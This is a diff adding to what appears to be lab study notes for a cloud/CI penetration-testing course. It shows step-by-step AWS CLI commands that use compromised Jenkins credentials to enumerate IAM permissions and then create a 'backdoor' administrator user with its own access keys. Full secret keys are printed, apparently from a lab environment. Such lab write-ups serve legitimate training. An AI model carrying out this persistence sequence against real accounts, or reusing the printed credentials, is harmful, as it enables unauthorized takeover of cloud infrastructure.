@@ -626,19 +626,149 @@ AWS_ACCESS_KEY_ID=AKIAUBHUBEGIMU2Y5GY7
 
 ### Discovering What We Have Access To
 
+Configured a new profile with the information discovered:
 
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws configure --profile=CompromisedJenkins
+AWS Access Key ID [None]: AKIAUBHUBEGIMU2Y5GY7
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-east-1
+Default output format [None]: 
+```
+{% endcode %}
+
+Getting User Name:
+
+```bash
+kali@kali:~$ aws --profile CompromisedJenkins sts get-caller-identity
+{
+    "UserId": "AIDAUBHUBEGILTF7TFWME",
+    "Account": "274737132808",
+    "Arn": "arn:aws:iam::274737132808:user/system/jenkins-admin",
+}
+```
+
+Listing Policies and Group for User:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
+{
+    "PolicyNames": [
+        "jenkins-admin-role"
+    ]
+}
+
+kali@kali:~$ aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
+{
+    "AttachedPolicies": []
+}
+
+kali@kali:~$ aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
+{
+    "Groups": []
+}
+```
+{% endcode %}
+
+Getting the user policy discovered:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
+{
+    "UserName": "jenkins-admin",
+    "PolicyName": "jenkins-admin-role",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Sid": "",
+                "Effect": "Allow",
+                "Action": "*",
+                "Resource": "*"
+            }
+        ]
+    }
+}
+```
+{% endcode %}
 
 ### Creating a Backdoor Account
 
+Creating our backdoor user:
 
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws --profile CompromisedJenkins iam create-user --user-name backdoor                                  
+{
+    "User": {
+        "Path": "/",
+        "UserName": "backdoor",
+        "UserId": "AIDAUBHUBEGIPX2SBIHLB",
+        "Arn": "arn:aws:iam::274737132808:user/backdoor",
+    }
+}
+```
+{% endcode %}
+
+Attaching the AdministratorAccess policy to our backdoor user:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+```
+{% endcode %}
+
+Getting our user creds:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
+{
+    "AccessKey": {
+        "UserName": "backdoor",
+        "AccessKeyId": "AKIAUBHUBEGIDGCLUM53",
+        "Status": "Active",
+        "SecretAccessKey": "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",
+    }
+}
+```
+{% endcode %}
+
+Configuring our new backdoor profile:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws configure --profile=backdoor                                           
+AWS Access Key ID [None]: AKIAUBHUBEGIDGCLUM53
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-east-1
+Default output format [None]:  
+
+kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name backdoor
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}
+```
+{% endcode %}
 
 ## Dependency Chain Abuse
 
 ### Accessing the Labs
 
+* A DNS server's IP address
+* A Kali IP address
+* A Kali password
 
-
-## Informationg Gathering
+## Information Gathering
 
 ### Enumerating the Services
 
